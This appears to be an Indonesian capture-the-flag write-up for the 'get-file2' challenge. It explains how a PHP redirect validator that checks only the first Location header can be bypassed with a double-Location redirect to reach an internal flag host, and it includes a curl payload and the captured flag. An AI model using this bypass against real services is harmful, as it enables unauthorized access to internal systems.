# get-file2

## Ringkasan

Bug ada di proses validasi redirect pada `src/file.php`. Aplikasi mengecek URL awal dan `Location` pertama dari hasil `get_headers()`, tapi saat mengambil isi URL dengan `file_get_contents()`, PHP stream wrapper tetap mengikuti redirect secara normal.

Endpoint internal flag berada di service `flag` dengan hostname `flag.thjcc`. Akses langsung ke `flag.thjcc` diblokir oleh fungsi validator, tapi bisa dilewati lewat redirector `r` yang mengirim **dua header `Location`**.

## File Challenge

Struktur penting:

```text
docker-compose.yml
src/file.php
redirector/server.py
flag/server.py
```

Service:

```yaml
w:
  build: .
  ports: ["8082:80"]

r:
  build: ./redirector

f:
  build: ./flag
  networks:
   n:
    aliases: [flag.thjcc]
```

Service flag hanya mau merespons jika header `Host` adalah `flag.thjcc` dan path adalah `/flag.txt`.

```python
if self.headers.get('Host','').split(':')[0].lower()!='flag.thjcc':
    self.send_response(403)
    self.end_headers()
    return

if self.path!='/flag.txt':
    self.send_response(404)
    self.end_headers()
    return
```

## Analisis Source

Kode utama ada di `src/file.php`.

```php
function a($s){
    $p=parse_url($s);
    return $p
        && isset($p['scheme'],$p['host'])
        && in_array(strtolower($p['scheme']),['http','https'],true)
        && strtolower(rtrim($p['host'],'.'))!=='flag.thjcc';
}
```

Fungsi `a()` hanya mengizinkan URL `http` atau `https`, dan melarang host `flag.thjcc`.

Fungsi `b()` melakukan dua tahap:

```php
$c=stream_context_create([
    'http'=>[
        'follow_location'=>false,
        'timeout'=>3,
        'ignore_errors'=>true
    ]
]);

$h=@get_headers($s,false,$c);
$n=null;

foreach($h?:[] as $v)
    if(preg_match('/^Location:/i',$v)){
        $n=trim(substr($v,strpos($v,':')+1));
        break;
    }

if($n!==null&&!a($n))throw new Exception();
```

Pada tahap ini, aplikasi mengambil header dari URL target tanpa mengikuti redirect. Kalau ada header `Location`, hanya **Location pertama** yang dicek.

Setelah itu, aplikasi mengambil isi URL asli:

```php
$c=stream_context_create([
    'http'=>[
        'timeout'=>3,
        'ignore_errors'=>true
    ]
]);

$x=@file_get_contents($s,false,$c);
```

Masalahnya, context kedua tidak mematikan `follow_location`. Secara default, PHP HTTP stream akan mengikuti redirect. Jadi validasi hanya melihat redirect pertama, tapi proses fetch bisa mengikuti redirect lain yang tidak divalidasi dengan benar.

## Analisis Redirector

Kode `redirector/server.py`:

```python
if self.path=='/a':
    self.send_response(302)
    self.send_header('Location','http://r/x')
    self.send_header('Location','http://flag.thjcc/flag.txt')
    self.end_headers()
```

Endpoint `/a` mengirim dua header `Location`:

```text
Location: http://r/x
Location: http://flag.thjcc/flag.txt
```

Validator di `file.php` hanya membaca `Location` pertama, yaitu:

```text
http://r/x
```

Host `r` bukan `flag.thjcc`, jadi lolos.

Namun saat `file_get_contents()` melakukan request sebenarnya, PHP stream mengikuti redirect dan akhirnya mengambil:

```text
http://flag.thjcc/flag.txt
```

## Exploit

Payload:

```bash
curl 'http://chal.thjcc.org:8082/file.php?u=http://r/a'
```

Output:

```text
THJCC{PHP_stream_30x_DuAl_65de4980cf}
```

## Kenapa `/b` Tidak Bisa

Endpoint `/b` hanya mengirim satu redirect:

```python
elif self.path=='/b':
    self.send_response(302)
    self.send_header('Location','http://flag.thjcc/flag.txt')
    self.end_headers()
```

Kalau memakai:

```bash
curl 'http://chal.thjcc.org:8082/file.php?u=http://r/b'
```

Validator akan langsung melihat `Location` pertama sebagai:

```text
http://flag.thjcc/flag.txt
```

Karena host-nya `flag.thjcc`, fungsi `a()` mengembalikan false dan request diblokir.

## Flag

```text
THJCC{PHP_stream_30x_DuAl_65de4980cf}
```
